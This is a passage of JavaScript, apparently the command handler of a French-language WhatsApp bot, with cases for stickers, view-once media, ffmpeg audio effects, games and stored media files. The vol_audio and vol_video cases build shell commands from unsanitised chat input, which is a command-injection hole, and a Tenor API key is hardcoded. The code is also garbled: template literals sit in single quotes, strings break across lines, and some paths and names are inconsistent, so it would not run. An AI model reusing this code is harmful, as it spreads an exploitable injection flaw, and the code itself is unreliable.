                let anu = await fetchJson('https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}')
                for (let res of anu.results) {
                    let encmedia = await Kev.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return replygckev('Exemple : ${prefix + command} 😅')
                let anu = await fetchJson('https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}')
                for (let res of anu.results) {
                    let encmedia = await Kev.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'en_vueunique':
            case 'toviewonce': {
                if (!quoted) return replygckev('Veuillez repondre a une image/video')
                if (/image/.test(mime)) {
                    anuan = await Kev.downloadAndSaveMediaMessage(quoted)
                    Kev.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await Kev.downloadAndSaveMediaMessage(quoted)
                    Kev.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await Kev.downloadAndSaveMediaMessage(quoted)
                   Kev.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'flip_texte': {
                if (args.length < 1) return replygckev('Exemple:\n${prefix}fliptext tonton Kev')
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygckev('\'\'\'「 FLIP TEXTE 」\'\'\'\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}')
            }
            break
            case 'en_qr':{
  if (!q) return replygckenv(' Veuillez y inclure in lien ou un texte !')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await Kev.sendMessage(from, { image: medi, caption:"We The Best!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'vol_audio': {
if (!args.join(" ")) return replygckev('Exemple: ${prefix + command} 10')
media = await Kev.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec('ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}', (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygckev('Error!')
jadie = fs.readFileSync(rname)
Kev.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'vol_video': {
if (!args.join(" ")) return replygckev('Exemple: ${prefix + command} 10')
media = await Kev.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec('ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}', (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygckev('Error!')
jadie = fs.readFileSync(rname)
Kev.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await KevStickWait()
                let media = await Kev.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec('ffmpeg -i ${media} ${set} ${ran}', (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygckev(err)
                let buff = fs.readFileSync(ran)
                Kev.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygckev('Veuillez repondre a l'audio que vous voulez modifier *${prefix + command}*')
                } catch (e) {
                replygckev(e)
                }
                break
                //media db
  case 'liste_grosmots':{
let teks = '┌──⭓「 *Liste de gros mots* 」\n│\n'
for (let x of bad) {
teks += '│⭔ ${x}\n'
}
teks += '│\n└────────────⭓\n\n*Total : ${bad.length}*'
replygckev(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./bibliotheque/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygckev('Vous etes deja dans le jeux')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    replygckev('adversaire introuvable !')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = 'Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat'
                    if (room.x !== room.o) await Kev.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await Kev.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    replygckev('Attente d.un adversaire' + (text ? ' Veuillez entrer la commande suivante ${prefix}${command} ${text}' : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'supp_tictactoe':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        Kev.sendText(m.chat, 'suppression de la session tictactoe', m)
                    } else if (!this.game) {
                        replygckev('Session TicTacToe🎮 )
                    } else replygckev('?')
                } catch (e) {
                    replygckev('Error')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygckev('Veuillez terminer la partie de suit precedente')
                if (m.mentionedJid[0] === m.sender) return replygckev('je ne peux pas jouer avec moi m�me !')
                if (!m.mentionedJid[0]) return replygckev('_Qui voulez-vous affronter ?_\nVeuillez mentionner la personne..\n\nExemple : ${prefix}suit @${owner[1]}', m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygckev('La personne mentionnee est en train d.affronter une autre personne :(')
                let id = 'suit_' + new Date() * 1
                let caption = '_*SUIT PvP*_

@${m.sender.split'@'[0]} challenged @${m.mentionedJid[0].split'@'[0]} pour jouer a suit

@${m.mentionedJid[0].split'@'[0]} Veuillez ecrire accept/reject, accept pour accepter et reject pour rejeter le challenge'
                this.suit[id] = {
                    chat: await Kev.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) Kev.sendText(m.chat, '_Temps ecouley_', m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'math_quizz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygckev('Presence d.une session non terminee !')
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygckev('Mode: ${Object.keys(modes).join(' | ')}\nUsage exemple: ${prefix}math medium')
                let result = await genMath(text.toLowerCase())
                Kev.sendText(m.chat, '*Quel est le resultat de: ${result.soal.toLowerCase()}*?\n\nTemps: ${(result.waktu / 1000).toFixed(2)} seconde', m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygckev("Le temps est ecouley\nReponse: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                replygckev('${m.pushName} *est parti AFK*${text ? ': ' + text : ''}')
            }
            break	
            case 'stp': {
	            if (!q) return replygckev('Exemple : ${prefix + command} Qui est le meilleur joueur de tous les temps, et pourquoi Messi?')
			      var isiai = await fetchJson('https://aemt.me/openai?text=${q}')
			      var isi = isiai.result
		         await replygckev(isi)
			   }
			   break
    case 'ephemere': {
                if (!m.isGroup) return KevStickGroup()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (!isAdmins) return KevStickAdmin()
                if (args[0] === 'oui') {
                    await Kev.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygckev('Effectuey')
                } else if (args[0] === 'non') {
                    await Kev.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygckev('Effectuey')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
            case 'supprimer': case 'supp': case 'del':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 Kev.sendMessage(m.chat, { delete: key })
}
break
    case 'lecture_autostatut':
    case 'autostatusview':{
             if (!KevTheCreator) return KevStickOwner()
               
               if (args[0] === 'oui') {
                  antiswview = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  antiswview = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'interdiction_appel': {
             if (!KevTheCreator) return KevStickOwner()
               
               if (args[0] === 'oui') {
                  anticall = true
                  replygckev('${command} activee')
               } else if (args[0] === 'non') {
                  anticall = false
                  replygckev('${command} desacivee')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
             break
case 'add_video':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer un nom pour cette video?')
if (VideoKev.includes(q)) return replygckev("Ce nom est deja pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
VideoKev.push(q)
await fsx.copy(delb, './KenvFile/video/${q}.mp4')
fs.writeFileSync('./KenvFile/database/kenvvideo.json', JSON.stringify(VideoKev))
fs.unlinkSync(delb)
replygckev('Video add\nPour verifier veuillez entrer ${prefix}liste_video')
}
break
case 'supp_video':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer le nom de la video')
if (!VideoKev.includes(q)) return replygckev("ce nom est inexistant dans la base de donnees")
let wanu = VideoKev.indexOf(q)
VideoKev.splice(wanu, 1)
fs.writeFileSync('./KenvFile/database/kenvvideo.json', JSON.stringify(VideoKev))
fs.unlinkSync('./KenvFile/video/${q}.mp4')
replygckev('Video supprimee ${q}')
}
break
case 'liste_video':{
let teks = '┌──⭓「 *Liste Des Videos * 」\n│\n'
for (let x of VideoKev) {
teks += '│⭔ ${x}\n'
}
teks += '│\n└────────────⭓\n\n*Total  : ${VideoKev.length}*'
replygckev(teks)
}
break
case 'add_image':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer un nom a cette image?')
if (ImageKev.includes(q)) return replygckev("Ce nom est deja pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
ImageKev.push(q)
await fsx.copy(delb, './KenvFile/image/${q}.jpg')
fs.writeFileSync('./KenvFile/database/kenvimage.json', JSON.stringify(ImageKev))
fs.unlinkSync(delb)
replygckev('Image add\nVeuillez verifier en entrant ${prefix}liste_image')
}
break
case 'supp_image':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer le nom de l.imafe')
if (!ImageKev.includes(q)) return replygckev("Ce nom est inexistant dans la base de donnees")
let wanu = ImageKev.indexOf(q)
ImageKev.splice(wanu, 1)
fs.writeFileSync('./Kenv/database/kenvimage.json', JSON.stringify(ImageKev))
fs.unlinkSync('./KenvFile/image/${q}.jpg')
replygckev('Image supprimee ${q}')
}
break
case 'liste_image':{
let teks = '┌──⭓「 *Liste d.Images * 」\n│\n'
for (let x of ImageKev) {
teks += '│⭔ ${x}\n'
}
teks += '│\n└────────────⭓\n\n*Total : ${ImageKev.length}*'
replygckev(teks)
}
break
case 'add_sticker':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer un nom a ce sticker?')
if (StickerKev.includes(q)) return replygckev("Ce nom est d�j� pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
StickerKev.push(q)
await fsx.copy(delb, './KenvFile/sticker/${q}.webp')
fs.writeFileSync('./KenvFile/database/kenvsticker.json', JSON.stringify(StickerKev))
fs.unlinkSync(delb)
replygckev('Sticker add\nVeuillez verifier en entrant ${prefix}liste_sticker')
}
break
case 'supp_sticker':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer le nom du sticker')
if (!StickerKev.includes(q)) return replygckev("Ce nom est inexistant dans la base de donnees")
let wanu = StickerKev.indexOf(q)
StickerKev.splice(wanu, 1)
fs.writeFileSync('./KenvFile/database/kenvsticker.json', JSON.stringify(StickerKev))
fs.unlinkSync('./KenvFile/sticker/${q}.webp')
replygckev('Sticker supprimey ${q}')
}
break
case 'liste_sticker':{
let teks = '┌──⭓「 *Liste De Stickers* 」\n│\n'
for (let x of StickerKev) {
teks += '│⭔ ${x}\n'
}
teks += '│\n└────────────⭓\n\n*Total : ${StickerKev.length}*'
replygckev(teks)
}
break
case 'add_msg': {
	if (!KevTheCreator) return KevStickOwner()
                if (!m.quoted) return replygckev('Veuillez repondre au message que vous voulez sauvegarder dans la base de donnees')
                if (!text) return replygckev('Exemple : ${prefix + command} nom du fichier')
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return replygckev(''${text}' enregistrey dans la liste de messages')
                msgs[text.toLowerCase()] = quoted.fakeObj
replygckev('message add dans la liste de messages comme '${text}'
    
Accedez-y avec ${prefix}voir_msg ${text}

Pour voir la liste de messages veuillez entrer ${prefix}liste_msg')
            }
            break
            case 'voir_msg': {
                if (!text) return replygckev('Exemple : ${prefix + command} nom du fichier\n\nPour voir la liste de messages veuillez entrer ${prefix}liste_msg')
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return replygckev(''${text}' absent de la liste de messages')
                Kev.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'liste_msg': {
                let msgs = JSON.parse(fs.readFileSync('./recherche/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' Liste \n\n'
		for (let i of seplit) {
		    teks += '${themeemoji} *Nom :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n'
	        }
	        replygckev(teks)
	    }
	    break 
	case 'supp_msg': case 'deletemsg': {
		if (!KevTheCreator) return KevStickOwner()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return replygckev(''${text}' absent de la liste des messages')
		delete msgs[text.toLowerCase()]
		replygckev(' '${text}' supprimey de la liste des messages')
            }
	    break
case 'add_voice':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer un nom a cet audio')
if (VoiceNoteKev.includes(q)) return replygckev("Ce nom est deja pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
VoiceNoteKev.push(q)
await fsx.copy(delb, './KenvFile/audio/${q}.mp3')
fs.writeFileSync('./KenvFile/database/kenvvn.json', JSON.stringify(VoiceNoteKev))
fs.unlinkSync(delb)
replygckev('Audio add\nPour le verifier veuillez enter  ${prefix}liste_voice')
}
break
case 'supp_voice':{
if (!KevTheCreator) return KevStickOwner()
if (args.length < 1) return replygckev('Veuillez entrer le nom du voice')
if (!VoiceNoteKev.includes(q)) return replygckev("ce nom est inexistant dans la base de donnees")
let wanu = VoiceNoteKev.indexOf(q)
VoiceNoteKev.splice(wanu, 1)
fs.writeFileSync('./KenvFile/database/kenvvn.json', JSON.stringify(VoiceNoteKev))
fs.unlinkSync('./KenvFile/audio/${q}.mp3')
replygckev('Voice supprimey ${q}')
}
break
case 'liste_voice':{
let teks = '┌──⭓「 * Liste Voices* 」\n│\n'
for (let x of VoiceNoteKev) {
teks += '│⭔ ${x}\n'
}
teks += '│\n└────────────⭓\n\n*Total : ${VoiceNoteKev.length}*'
replygckev(teks)
}
break
case 'add_zip':{
if (!KevTheCreator) return KevStickOwner()

if (args.length < 1) return replygckev('Veuillez entrer un nom a ce fichier zip')
let teks = '${text}'
{
if (ZipKev.includes(teks)) return replygckev("Ce nom est deja pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
ZipKev.push(teks)
await fsx.copy(delb, './KenvFile/zip/${teks}.zip')
fs.writeFileSync('./KenvFile/database/zip.json', JSON.stringify(ZipKev))
fs.unlinkSync(delb)
replygckev('Fichier zip add\nPour verifier veuillez enter ${prefix}liste_zip')
}
}
break
case 'supp_zip':{
if (!KevTheCreator) return KevStickOwner()

if (args.length < 1) return replygckev('Veuillez enter le nom du fichier zip')
let teks = '${text}'
{
if (!ZipKev.includes(teks)) return replygckev("Ce nom est inexistant dans la base de donnees")
let wanu = ZipKev.indexOf(teks)
ZipKev.splice(wanu, 1)
fs.writeFileSync('./KenvFile/database/zip.json', JSON.stringify(ZipKev))
fs.unlinkSync('./KenvFike/zip/${teks}.zip')
replygckev('Fichier zip supprimey ${teks}')
}
}
break
case 'liste_zip': {

let teksooooo = '┌──⭓「 * LISTE DE FICHIES ZIP* 」\n│\n'
for (let x of ZipKev) {
teksooooo += '│⭔ ${x}\n'
}
teksooooo += '│\n└────────────⭓\n\n*Total : ${ZipKev.length}*'
replygckev(teksooooo)
}
break
case 'add_apk':{
if (!KevTheCreator) return KevStickOwner()

if (args.length < 1) return replygckev('Veuillez entrer un nom a cette apk')
let teks = '${text}'
{
if (ApkKev.includes(teks)) return replygckev("Ce nom est deja pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, './KenvFile/apk/${teks}.apk')
fs.writeFileSync('./KenvFile/database/apk.json', JSON.stringify(ApkKev))
fs.unlinkSync(delb)
replygckev('apk add\nPour verifier veuillez entrer ${prefix}liste_apk')
}
}
break
case 'supp_apk':{
if (!KevTheCreator) return KevStickOwner()

if (args.length < 1) return replygckev('Vruillez enter le nom de l.apk')
let teks = '${text}'
{
if (!ApkKev.includes(teks)) return replygckev("Ce nom est deja pris")
let wanu = ApkKev.indexOf(teks)
ApkKev.splice(wanu, 1)
fs.writeFileSync('./KenvFile/database/apk.json', JSON.stringify(ApkKev))
fs.unlinkSync('./KenvFile/apk/${teks}.apk')
replygckev('Apk supprimee ${teks}')
}
}
break
case 'liste_apk': {

let teksoooooo = '┌──⭓「 *LISTE APK * 」\n│\n'
for (let x of ApkKev) {
teksoooooo += '│⭔ ${x}\n'
}
teksoooooo += '│\n└────────────⭓\n\n*Total : ${ApkKev.length}'
replygckev(teksoooooo)
}
break
case 'addpdf':{
if (!KevTheCreator) return KevStickOwner()

if (args.length < 1) return replygckev('Veuiller entrer un nom a ce pdf')
let teks = '${text}'
{
if (DocKev.includes(teks)) return replygckev("Ce nom est deja pris")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
DocKev.push(teks)
await fsx.copy(delb, './KenvFile/doc/${teks}.pdf')
fs.writeFileSync('./KenvFike/database/doc.json', JSON.stringify(DocKev))
fs.unlinkSync(delb)
replygckev(' Pdf add \nPour verifier veuillez entrer ${prefix}liste_pdf')
}
}
break
case 'supp_pdf':{
if (!KevTheCreator) return KevStickOwner()

if (args.length < 1) return replygckev('Veuillez entrer le nom')
let teks = '${text}'
{
if (!DocKev.includes(teks)) return replygckev("Ce nom est inexistant dans la base de donnees")
let wanu = DocKev.indexOf(teks)
DocKev.splice(wanu, 1)
fs.writeFileSync('./KenvFile/database/doc.json', JSON.stringify(DocKev))
fs.unlinkSync('./KenvFike/doc/${teks}.pdf')
replygckev('Pdf supprimey ${teks}')
}
}
break
case 'liste_pdf': {

let teksoooo = '┌──⭓「 *LISTE DE PDF* 」\n│\n'
for (let x of DocKev) {
teksoooo += '│⭔ ${x}\n'
}
teksoooo += '│\n└────────────⭓\n\n*Total : ${DocKev.length}*'
replygckev(teksoooo)
}
break
case 'ami':
case 'searchfriend':{
await KevStickWait()
let teman = pickRandom(kevverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygckev('Managed to Get One Person')
}, 5000)
setTimeout(() => {
Kev.sendMessage(from, {text: 'Here @${teman.split("@")[0]}', mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'precedent': {
if (!m.quoted) return replygckev('Veuillez repondre a un message!!')
let kevquotx= await Kev.serializeM(await m.getQuotedObj())
if (!kevquotx.quoted) return replygckev('Ce message n.a pas ete send par le bot')
await kevquotx.quoted.copyNForward(m.chat, true)
}
break
case 'cripter': case 'obfuscate':{
if (!q) return replygckev('Exemple ${prefix+command} const sylversbot = require('baileys')')
let meg = await obfus(q)
replygckev('Succes
${meg.result}')
}
break
case 'style': case 'styletexte': {
		let { styletext } = require('./bibliotheque/scraper')
		if (!text) return replygckev('Veuillez entrer un texte!')
                let anu = await styletext(text)
                let teks = 'Style Text From ${text}\n\n'
                for (let i of anu) {
                    teks += '${themeemoji} *${i.name}* : ${i.result}\n\n'
                }
                replygckev(teks)
	    }
	    break
case 'yt_rech2': case 'recherche_yt2': {
                if (!text) return replygckev('Exemple : ${prefix + command} Les armes antiques de one piece')
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'Recherche YouTube\n\n Resultat '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += '${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Titre : ${i.title}\n${themeemoji} Vues : ${i.views}\n${themeemoji} Duree : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n'
                }
                Kev.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            
            case 'yt_rech': case 'recherche_yt': {
  if (!text) return replygckev('*Exemple :* ${prefix + command} titre');
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygckev('Acune video trouvee');
      return;
